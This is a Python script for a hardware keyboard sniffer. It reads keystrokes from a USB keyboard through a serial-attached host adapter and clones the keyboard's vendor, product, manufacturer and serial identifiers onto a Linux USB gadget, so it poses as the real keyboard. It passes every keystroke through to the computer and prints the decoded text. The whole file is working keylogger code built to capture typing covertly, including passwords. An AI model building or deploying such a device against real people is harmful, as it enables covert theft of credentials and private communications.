import serial
import re
import os


class KeyboardSniffer:
    def __init__(self, port: str = '/dev/serial0', baudrate: int = 115200, verbose: bool = False):
        # Regular expressions to match device info and keyboard reports
        self.device_info_pattern = re.compile(
            r'\[\+\] DeviceInfo: VID=([0-9A-Fa-f]+) PID=([0-9A-Fa-f]+) '
            r'MANU="([^"]*)" PROD="([^"]*)" SERIAL="([^"]*)"')

        self.report_pattern = re.compile(
            r'\[\+\] Keyboard report \[mod=0x([0-9A-Fa-f]+)\]:(.*)')

        self.disconnect_pattern = re.compile(
            r'\[\-\] HID device removed: addr=([0-9]+), instance=([0-9]+)')

        # Paths and constants for USB gadget configuration
        self.hid_device_path = '/dev/hidg0'
        self.language_code = '0x409'  # English strings
        self.gadget_path = '/sys/kernel/config/usb_gadget/g1'
        self.udc_file = os.path.join(self.gadget_path, 'UDC')
        self.config_path = os.path.join(self.gadget_path, 'configs/c.1')
        self.function_path = os.path.join(
            self.gadget_path, 'functions/hid.usb0')
        self.strings_path = os.path.join(
            self.gadget_path, 'strings', self.language_code)

        self.descriptor = bytes([
            0x05, 0x01,        # Usage Page (Generic Desktop)
            0x09, 0x06,        # Usage (Keyboard)
            0xA1, 0x01,        # Collection (Application)
            0x05, 0x07,        #   Usage Page (Key Codes)
            0x19, 0xE0,        #   Usage Minimum (224)
            0x29, 0xE7,        #   Usage Maximum (231)
            0x15, 0x00,        #   Logical Minimum (0)
            0x25, 0x01,        #   Logical Maximum (1)
            0x75, 0x01,        #   Report Size (1)
            0x95, 0x08,        #   Report Count (8)
            0x81, 0x02,        #   Input (Data, Variable, Absolute) - Modifier byte
            0x95, 0x01,        #   Report Count (1)
            0x75, 0x08,        #   Report Size (8)
            0x81, 0x01,        #   Input (Constant) - Reserved byte
            0x95, 0x06,        #   Report Count (6)
            0x75, 0x08,        #   Report Size (8)
            0x15, 0x00,        #   Logical Minimum (0)
            0x25, 0x65,        #   Logical Maximum (101)
            0x05, 0x07,        #   Usage Page (Key codes)
            0x19, 0x00,        #   Usage Minimum (0)
            0x29, 0x65,        #   Usage Maximum (101)
            0x81, 0x00,        #   Input (Data, Array)

            # Output report for LEDs
            0x05, 0x08,        #   Usage Page (LEDs)
            0x19, 0x01,        #   Usage Minimum (1)
            0x29, 0x05,        #   Usage Maximum (5)
            0x95, 0x05,        #   Report Count (5)
            0x75, 0x01,        #   Report Size (1)
            0x91, 0x02,        #   Output (Data, Variable, Absolute)
            0x95, 0x01,        #   Report Count (1)
            0x75, 0x03,        #   Report Size (3)
            0x91, 0x01,        #   Output (Constant) - Padding

            0xC0               # End Collection
        ])


        # Create the Serial connection
        self.ser = serial.Serial(port, baudrate, timeout=0.1)

        # Reset the keyboard to get a new connection
        self.reset_keyboard()

        # Wait for a keyboard to be connected and device info to be returned
        self.device_info = self.get_device_info()

        if verbose:
            print("[+] Device information retrieved successfully.")
            print(f"Device Info: VID={self.device_info['vid']}, "
                  f"PID={self.device_info['pid']}, "
                  f"Manufacturer={self.device_info['manufacturer']}, "
                  f"Product={self.device_info['product']}, "
                  f"Serial={self.device_info['serial']}")

        # Start the USB gadget with the retrieved device info
        if verbose:
            print("[+] Starting USB gadget...")
        self.start_usb_gadget(self.device_info)
        if verbose:
            print("[+] USB gadget started successfully.")

    def reset_keyboard(self) -> None:
        # Reset the keyboard by sending a 0xFF to the serial port
        self.ser.write(b'\xFF')

    def get_device_info(self) -> dict:
        # Wait for the device info line from the serial output
        while True:
            line = self.ser.readline().decode(errors='ignore').strip()
            if not line:
                continue

            match = self.device_info_pattern.match(line)
            if match:
                return {
                    'vid': match.group(1),
                    'pid': match.group(2),
                    'manufacturer': match.group(3),
                    'product': match.group(4),
                    'serial': match.group(5)
                }
            else:
                print(f"Received line: {line}")

    def get_keycodes_filtered(self) -> 'Generator[tuple[int, list[int]], None, None]':
        # This generator yields keycodes while filtering out duplicates
        last_presses = []

        while True:
            mod, keycodes = next(self.get_keycodes())

            new_presses = [
                keycode for keycode in keycodes if keycode not in last_presses]
            last_presses = keycodes

            if new_presses:
                yield mod, new_presses

    def get_keycodes(self) -> 'Generator[tuple[int, list[int]], None, None]':
        # This generator reads lines from the serial port and yields keycodes        
        while True:
            self.query_led_reports()  # Check for LED reports
            
            line = self.ser.readline().decode(errors='ignore').strip()
            if not line:
                continue

            match = self.report_pattern.match(line)
            if match:
                mod = int(match.group(1), 16)
                keycodes = [int(x, 16) for x in match.group(2).strip().split()]

                self.send_keyboard_report(mod, keycodes)

                yield mod, keycodes
            else:
                if self.disconnect_pattern.match(line):
                    print(f"Device disconnected: {line}")
                    self.stop_gadget()
                    self.device_info = self.get_device_info()
                    self.start_usb_gadget(self.device_info)
                print(f"Received line: {line}")  # Debug output

    def keycode_to_ascii(self, mod: int, keycode: int) -> str | None:
        # HID usage ID to ASCII mapping (US layout, minimal)
        hid_keycodes = {
            0x04: 'a', 0x05: 'b', 0x06: 'c', 0x07: 'd',
            0x08: 'e', 0x09: 'f', 0x0A: 'g', 0x0B: 'h',
            0x0C: 'i', 0x0D: 'j', 0x0E: 'k', 0x0F: 'l',
            0x10: 'm', 0x11: 'n', 0x12: 'o', 0x13: 'p',
            0x14: 'q', 0x15: 'r', 0x16: 's', 0x17: 't',
            0x18: 'u', 0x19: 'v', 0x1A: 'w', 0x1B: 'x',
            0x1C: 'y', 0x1D: 'z', 0x1E: '1', 0x1F: '2',
            0x20: '3', 0x21: '4', 0x22: '5', 0x23: '6',
            0x24: '7', 0x25: '8', 0x26: '9', 0x27: '0',
            0x28: '\n', 0x2C: ' ', 0x2D: '-', 0x2E: '=',
            0x2F: '[', 0x30: ']', 0x31: '\\', 0x33: ';',
            0x34: '\'', 0x35: '`', 0x36: ',', 0x37: '.',
            0x38: '/'
        }

        shifted_keys = {
            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
            '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
            ';': ':', '\'': '"', '`': '~', ',': '<', '.': '>', '/': '?'
        }

        key = hid_keycodes.get(keycode)
        if not key:
            return None

        if mod & 0x22:  # Shift held
            return shifted_keys.get(key, key.upper())
        return key

    def start_usb_gadget(self, device_info) -> None:
        # Ensure any previous gadget is stopped
        self.stop_gadget()

        # Create the USB gadget directory if it doesn't exist
        if not os.path.exists(self.gadget_path):
            os.makedirs(self.gadget_path)

        # Create the required directories for the gadget
        os.makedirs(self.config_path)
        os.makedirs(self.strings_path)

        # Set device descriptor info based on the provided dictionary
        # Set VID and PID
        with open(os.path.join(self.gadget_path, 'idVendor'), 'w') as f:
            f.write(f"0x{device_info['vid']}")
        with open(os.path.join(self.gadget_path, 'idProduct'), 'w') as f:
            f.write(f"0x{device_info['pid']}")

        # Set Manufacturer, Product and Serial String descriptors
        with open(os.path.join(self.strings_path, 'manufacturer'), 'w') as f:
            f.write(device_info['manufacturer'])
        with open(os.path.join(self.strings_path, 'product'), 'w') as f:
            f.write(device_info['product'])

        # If serial number is available, set it, otherwise leave empty
        with open(os.path.join(self.strings_path, 'serialnumber'), 'w') as f:
            f.write(device_info['serial'] or '')

        # Configure the gadget as a HID device (keyboard)
        os.makedirs(self.function_path)

        # Set the HID descriptor (optional, example only)
        with open(os.path.join(self.function_path, 'protocol'), 'w') as f:
            f.write('1')
        with open(os.path.join(self.function_path, 'subclass'), 'w') as f:
            f.write('1')
        with open(os.path.join(self.function_path, 'report_length'), 'w') as f:
            f.write('8')
        with open(os.path.join(self.function_path, 'report_desc'), 'wb') as f:
            f.write(self.descriptor)

        # Enable the gadget
        os.symlink(self.function_path,
                   os.path.join(self.gadget_path, 'configs/c.1/hid.usb0'))

        # Get UDC (USB Device Controller) name
        udc_path = '/sys/class/udc'
        if not os.path.exists(udc_path):
            raise RuntimeError(
                "UDC path does not exist. Ensure the kernel supports USB gadget mode.")
        udc_name = os.listdir(udc_path)
        if not udc_name:
            raise RuntimeError(
                "No UDC found. Ensure the kernel supports USB gadget mode.")
        udc_name = udc_name[0]

        # Activate the gadget
        with open(self.udc_file, 'w') as f:
            f.write(udc_name)
            
        # Open the HID device file for reading LED reports
        self.hid_fd = os.open(self.hid_device_path, os.O_RDONLY | os.O_NONBLOCK)

    def stop_gadget(self):
        try:
            # Disable gadget by unbinding UDC
            if os.path.exists(self.udc_file):
                with open(self.udc_file, 'w') as f:
                    f.write('')

            # Remove function symlink
            symlink_path = os.path.join(self.config_path, 'hid.usb0')
            if os.path.islink(symlink_path):
                os.unlink(symlink_path)

            # Remove function directory
            if os.path.exists(self.function_path):
                os.rmdir(self.function_path)

            # Remove config and string directories
            strings_path = os.path.join(self.gadget_path, 'strings/0x409')
            if os.path.exists(strings_path):
                os.rmdir(strings_path)
            if os.path.exists(self.config_path):
                os.rmdir(self.config_path)

            # Finally remove the gadget itself
            if os.path.exists(self.gadget_path):
                os.rmdir(self.gadget_path)
        except Exception as e:
            raise RuntimeError(f"Failed to stop USB gadget: {e}")

    def send_keyboard_report(self, mod: int, keycodes: list[int]) -> None:
        # Prepare the HID report format (8 bytes)
        report = bytearray(8)
        report[0] = mod  # Modifier keys (Ctrl, Shift, etc.)
        report[1] = 0x00  # Reserved byte
        for i in range(min(6, len(keycodes))):
            report[i + 2] = keycodes[i]

        # Send the report to the HID device
        with open(self.hid_device_path, 'wb') as f:
            f.write(report)
            f.flush()

    def query_led_reports(self):
        try:
            data = os.read(self.hid_fd, 1)
            if data:
                self.ser.write(data)  # Echo back the LED state
        except BlockingIOError:
            pass
        except Exception as e:
            raise RuntimeError(f"Failed to read LED report: {e}")


def main():
    decoder = KeyboardSniffer()
    print("Listening for keyboard input... Press Ctrl+C to exit.")

    try:
        for mod, keycodes in decoder.get_keycodes_filtered():
            for keycode in keycodes:
                ascii_char = decoder.keycode_to_ascii(mod, keycode)
                if ascii_char:
                    print(ascii_char, end='', flush=True)
    except KeyboardInterrupt:
        print("\nExiting...")
    finally:
        decoder.ser.close()


if __name__ == '__main__':
    main()
